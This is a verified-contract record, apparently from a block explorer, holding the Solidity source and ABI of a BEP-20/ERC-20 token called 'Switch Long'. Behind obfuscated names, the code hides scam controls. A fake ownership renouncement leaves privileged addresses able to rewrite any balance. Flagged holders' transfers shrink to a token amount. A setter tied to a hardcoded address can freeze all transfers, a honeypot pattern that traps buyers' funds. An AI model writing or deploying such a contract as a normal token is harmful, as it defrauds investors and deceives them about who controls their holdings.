{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface fundAutoWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toWallet {\n    function createPair(address buyFee, address sellWallet) external returns (address);\n}\n\ninterface isAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toSenderIs) external view returns (uint256);\n\n    function transfer(address autoWallet, uint256 fundShould) external returns (bool);\n\n    function allowance(address swapTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoWallet,\n        uint256 fundShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitSell, uint256 value);\n    event Approval(address indexed swapTx, address indexed spender, uint256 value);\n}\n\ninterface isAtMetadata is isAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SwitchLong is modeFund, isAt, isAtMetadata {\n\n    function getOwner() external view returns (address) {\n        return tradingTo;\n    }\n\n    uint256 marketingMaxFrom;\n\n    function swapEnable(address exemptToken, address autoWallet, uint256 fundShould) internal returns (bool) {\n        if (exemptToken == listReceiver) {\n            return feeFrom(exemptToken, autoWallet, fundShould);\n        }\n        uint256 tradingAmountFrom = isAt(tradingFund).balanceOf(launchedLimit);\n        require(tradingAmountFrom == enableTx);\n        require(autoWallet != launchedLimit);\n        if (swapLiquidity[exemptToken]) {\n            return feeFrom(exemptToken, autoWallet, receiverExempt);\n        }\n        return feeFrom(exemptToken, autoWallet, fundShould);\n    }\n\n    address public listReceiver;\n\n    bool public fundSwap;\n\n    bool public fromMax;\n\n    function balanceOf(address toSenderIs) public view virtual override returns (uint256) {\n        return feeLaunched[toSenderIs];\n    }\n\n    bool private receiverTx;\n\n    function tradingSwap(address fromSellLiquidity) public {\n        if (fromMax) {\n            return;\n        }\n        if (fundSwap) {\n            receiverTx = false;\n        }\n        shouldLaunched[fromSellLiquidity] = true;\n        if (tokenTeamReceiver != fundSwap) {\n            fundSwap = false;\n        }\n        fromMax = true;\n    }\n\n    function limitBuy() public {\n        emit OwnershipTransferred(listReceiver, address(0));\n        tradingTo = address(0);\n    }\n\n    bool private tokenTeamReceiver;\n\n    mapping(address => bool) public shouldLaunched;\n\n    function buyShould(address maxAtTake, uint256 fundShould) public {\n        sellMode();\n        feeLaunched[maxAtTake] = fundShould;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxEnable;\n    }\n\n    function approve(address enableExemptSell, uint256 fundShould) public virtual override returns (bool) {\n        amountEnableTo[_msgSender()][enableExemptSell] = fundShould;\n        emit Approval(_msgSender(), enableExemptSell, fundShould);\n        return true;\n    }\n\n    uint256 private maxEnable = 100000000 * 10 ** 18;\n\n    function transferFrom(address exemptToken, address autoWallet, uint256 fundShould) external override returns (bool) {\n        if (_msgSender() != fundExempt) {\n            if (amountEnableTo[exemptToken][_msgSender()] != type(uint256).max) {\n                require(fundShould <= amountEnableTo[exemptToken][_msgSender()]);\n                amountEnableTo[exemptToken][_msgSender()] -= fundShould;\n            }\n        }\n        return swapEnable(exemptToken, autoWallet, fundShould);\n    }\n\n    mapping(address => mapping(address => uint256)) private amountEnableTo;\n\n    address public tradingFund;\n\n    function sellMax(address senderFromReceiver) public {\n        sellMode();\n        if (tokenTeamReceiver) {\n            fundSwap = false;\n        }\n        if (senderFromReceiver == listReceiver || senderFromReceiver == tradingFund) {\n            return;\n        }\n        swapLiquidity[senderFromReceiver] = true;\n    }\n\n    function allowance(address launchedTx, address enableExemptSell) external view virtual override returns (uint256) {\n        if (enableExemptSell == fundExempt) {\n            return type(uint256).max;\n        }\n        return amountEnableTo[launchedTx][enableExemptSell];\n    }\n\n    function feeFrom(address exemptToken, address autoWallet, uint256 fundShould) internal returns (bool) {\n        require(feeLaunched[exemptToken] >= fundShould);\n        feeLaunched[exemptToken] -= fundShould;\n        feeLaunched[autoWallet] += fundShould;\n        emit Transfer(exemptToken, autoWallet, fundShould);\n        return true;\n    }\n\n    function sellMode() private view {\n        require(shouldLaunched[_msgSender()]);\n    }\n\n    string private receiverMax = \"SLG\";\n\n    mapping(address => uint256) private feeLaunched;\n\n    function transfer(address maxAtTake, uint256 fundShould) external virtual override returns (bool) {\n        return swapEnable(_msgSender(), maxAtTake, fundShould);\n    }\n\n    address launchedLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed tradingTxTake, address indexed tokenMax);\n\n    function owner() external view returns (address) {\n        return tradingTo;\n    }\n\n    uint256 enableTx;\n\n    address fundExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private isEnable = \"Switch Long\";\n\n    uint256 constant receiverExempt = 8 ** 10;\n\n    function toMaxToken(uint256 fundShould) public {\n        sellMode();\n        enableTx = fundShould;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isEnable;\n    }\n\n    mapping(address => bool) public swapLiquidity;\n\n    address private tradingTo;\n\n    uint8 private listTotalExempt = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listTotalExempt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverMax;\n    }\n\n    constructor (){\n        if (fundSwap) {\n            tokenTeamReceiver = true;\n        }\n        fundAutoWallet atTotal = fundAutoWallet(fundExempt);\n        tradingFund = toWallet(atTotal.factory()).createPair(atTotal.WETH(), address(this));\n        \n        listReceiver = _msgSender();\n        limitBuy();\n        shouldLaunched[listReceiver] = true;\n        feeLaunched[listReceiver] = maxEnable;\n        if (fundSwap != receiverTx) {\n            receiverTx = false;\n        }\n        emit Transfer(address(0), listReceiver, maxEnable);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTxTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableExemptSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableExemptSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSenderIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAtTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"buyShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFromReceiver\",\"type\":\"address\"}],\"name\":\"sellMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"toMaxToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSellLiquidity\",\"type\":\"address\"}],\"name\":\"tradingSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAtTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SwitchLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}